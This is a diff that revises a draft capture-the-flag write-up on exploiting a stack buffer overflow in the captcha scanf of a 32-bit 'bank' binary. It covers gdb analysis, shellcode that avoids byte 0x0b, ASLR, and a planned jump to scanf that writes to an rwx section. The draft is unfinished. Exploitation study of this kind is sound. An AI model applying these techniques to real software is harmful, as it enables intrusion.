@@ -14,7 +14,7 @@ Credit: Tux#1576
 
 ## Solution
 
-### Step 1: Run the Program
+### 1. Run the Program
 
 Download the [bank](bank) file and inspect it. The `file` commands shows that the binary is a 32-bit executable and stripped of its debug symbols:
 ```
@@ -71,7 +71,7 @@ A few quick notes from the initial run:
 2. Entering any non-numeric character results in an infinite loop of the same error message.
 3. The deposit and withdraw options require a **captcha**, which is always the same: **b3sTbAnK**. Even though the captcha is only eight characters long, the function accepts input of much longer length.
 
-### Step 2: Decompile with Ghidra
+### 2. Decompile with Ghidra
 
 Open the binary in Ghidra and analyze the file. In the **Symbol Tree** under **Functions**, click the `entry` function. This function just calls `__libc_start_main` with `FUN_080493dc` as a parameter.
 ```c
@@ -178,7 +178,7 @@ uint captcha(void)
 
 The full decompiled program can be viewed here: [bank.c](bank.c).
 
-### Step 3: Force a Segmentation Fault
+### 3. Force a Segmentation Fault
 
 What would happen if more than 1000 characters are sent to the `captcha` method? Build a quick payload file with python:
 ```
@@ -202,7 +202,7 @@ Segmentation fault (core dumped)
 
 A captcha input of 1012 characters or more results in a segmentation fault. Anything less does not. This 1012 character limit was determined through trial and error.
 
-### Step 4: Debug with GDB
+### 4. Debug with GDB
 
 Find out what caused the segmentation fault. Open the program in gdb. Run the program with the payload:
 ```
@@ -489,7 +489,7 @@ Breakpoint 2, 0x08049276 in ?? ()
 
 At `0x8049277`, the `ret` instruction is about to pop and return to address `0x43434343`, which is "CCCC" in hex from the payload. Therefore, the payload successfully manipulated the instruction pointer at the `0x8049277:ret` instruction!
 
-### Step 5: Create Shellcode Payload (Exploit Version 1)
+### 5. Create Shellcode Payload (Exploit Version 1)
 
 At this point, it's tempting to write shell code to the stack and jump to the shell code address per the instructions in [LiveOverflow's video][4]. Give this approach a try. 
 
@@ -614,7 +614,7 @@ v
 
 Turns out that `scanf` stops scanning at `0x0b`, which is a vertical tab according to the [ascii table](http://www.asciitable.com/). What happens if this byte is removed? Try it. Remove byte `0x0b`, run the script again, and examine the stack. The stack and payload now match. Thus, only byte `0x0b` causes an issue. Is it possible to get around this? Yes.
 
-### Step 6: Circumvent Scanf's `0x0b` Limitation
+### 6. Circumvent Scanf's `0x0b` Limitation
 
 The `scanf` function stops scanning at byte `0x0b` likely because `0x0b` is considered a terminating character. Therefore, this byte must be removed from the payload. And the question becomes: how to deliver the same payload without byte `0x0b`?
 
@@ -734,7 +734,7 @@ mov al,0xff     0xb0 0xff
 sub al,0xf4     0x2c 0xf4
 ```
 
-### Step 7: Execute a Shell (Exploit Version 2)
+### 7. Execute a Shell (Exploit Version 2)
 
 Now with the `scanf` byte `0xb` circumvention tactics in hand, create a new [exploit script](exploit2.py) to take advantage of this new information. Remove the `b0 0b` bytes from the original shell code and add in the `mov` and `sub` opcodes:
 ```python
@@ -812,7 +812,7 @@ esp            0xffa73dd0   0xffa73dd0
 
 This `0xffa73dd0` address is far off from the predicted `0xffffdd6c` address used in the payload. Why is it so different? This difference is due to [Address Space Layout Randomization (ASLR)][9]. Therefore, the stack address found in gdb (`0xffffdd6c`) cannot be used in a live program. Furthermore, gdb has ASLR turned off by default for easier debugging ([set disable-randomization][23]).
 
-### Step 8: Inspect Program Security with Checksec and Proc Maps
+### 8. Inspect Program Security with Checksec and Proc Maps
 
 Before attempting to defeat ASLR, first explore other options. Check the program's security settings with `checksec`:
 ```
@@ -863,7 +863,7 @@ A process's proc map can also be viewed in gdb with this command:
 
 Run the bank program a few more times and print its proc map again. Notice that the `f7d93000` addresses always change due to ASLR. However, addresses from `08048000` to `0804d000` always stay the same. Additionally, section `0804c000-0804d000` has `rwx` permissions (read, write, and execute). This section is particularly vulnerable to exploitation.
 
-### Step 9: Jump to Scanf (Exploit Version 3)
+### 9. Understand How Scanf Works
 
 The payload cannot reliably jump back to the stack due to ASLR. Therefore, the payload has to write to and jump back to a non-moving and writable location in memory, like section `0804c000-0804d000`. Can the payload manipulate `scanf` to write to any location like `0804c000`? Yes, it can.
 
@@ -906,7 +906,7 @@ Captcha: => 0x8049208:  add    esp,0x10
 (gdb) 
 ```
 
-Examine 10 instructions from `0x8049208`. Note the comments after semi-colons that point out input save location and the `%s` [format string][1]:
+Examine 10 instructions from `0x8049208`. Note the comments after semi-colons that point out the input save location and the `%s` [format string][1]:
 ```
 (gdb) x/10i $eip
 => 0x8049208:   add    esp,0x10
@@ -922,35 +922,17 @@ Examine 10 instructions from `0x8049208`. Note the comments after semi-colons th
 0x804a0f7:  "%s"
 ```
 
-### STOPPED HERE
+These instructions set up the stack for the `scanf` call. Three values get pushed onto the stack. The first is `ebp-0x3f4`, which is the memory location to save the user's captcha input (this will be confirmed in a moment). The second is `ebx-0x1f09` which equates to address `0x804a0f7` and points to the format string `%s`. The third is the return address `0x8049221` that gets pushed at the `call` instruction. The [call instruction][22] can be broken down into two instructions:
 ```
-CALL actually does this for you for example
-CALL my_func
-would do something like
-
-push ret_address
-jmp my_func
+push return_address
+jmp my_function
 ```
-Continue the program until the scanf breakpoint hits:
-```
-(gdb) c
-Continuing.
-=> 0x8049080 <__isoc99_scanf@plt>:  jmp    DWORD PTR ds:0x804c020
-0xffffd94c: 0x08049221  0x0804a0f7  0xffffd974  0x00000002
-0xffffd95c: 0x080491c1  0x00010001  0x00381ea0  0x62808426
-0xffffd96c: 0x62547333  0x004b6e41  0xffffd970  0xf7fdf289
-0xffffd97c: 0x000000d5  0xf7dd9cb8  0x677f9a5f  0xf7fd0110
-
-Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
-```
-
-Examine the first three values of the stack:
+Continue the program until the `scanf` breakpoint hits. Examine the first three values of the stack:
 ```     
-            %s
-            v
-0x08049221  0x0804a0f7  0xffffd974
-^                       ^
-return address          address to write to
+0xffffd94c: 0x08049221  0x0804a0f7  0xffffd974
+^           |           ^           ^
+esp         ^           %s          address to write to
+            return address          
 ```
 
 `0x08049221` is the return address:
@@ -958,7 +940,7 @@ return address          address to write to
 0x804921c:  call   0x8049080 <__isoc99_scanf@plt>
 0x8049221:  add    esp,0x10
 ^ 
-this is the return address after the scanf call completes
+address to return to after scanf completes
 ```
 
 `0x0804a0f7` is `%s`:
@@ -967,18 +949,25 @@ this is the return address after the scanf call completes
 0x804a0f7:  "%s"
 ```
 
-Check if %s is always at address: 0x804a0f7. Yes it is. According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 
-
-`0xffffd974` is the location that scanf will write to. To confirm this, continue the program and check this memory location:
+`0xffffd974` is the location that `scanf` will write to. To confirm this, continue the program and examine the memory at this location:
 ```
 (gdb) x/s 0xffffd974
 0xffffd974: 'A' <repeats 200 times>...
 ```
 
-### New Section
+In summary, `scanf` requires three components on the stack starting from the top:
 
-Ok now alls left to do is mock up the stack in this same way, jump to scanf and execute the payload! 
+1. Return address
+2. Format string
+3. Write location
 
+With these three pieces, it is possible to craft a payload to write to the vulnerable location at `0804c000` and execute the shellcode.
+
+### 10. Jump to Scanf (Exploit Version 3)
+
+All that is left to do is create the payload with the three `scanf` components and exploit.
+
+### STOPPED HERE
 First get the address of scanf, which we already have a breakpoint for:
 ```
 0x08049080  __isoc99_scanf@plt
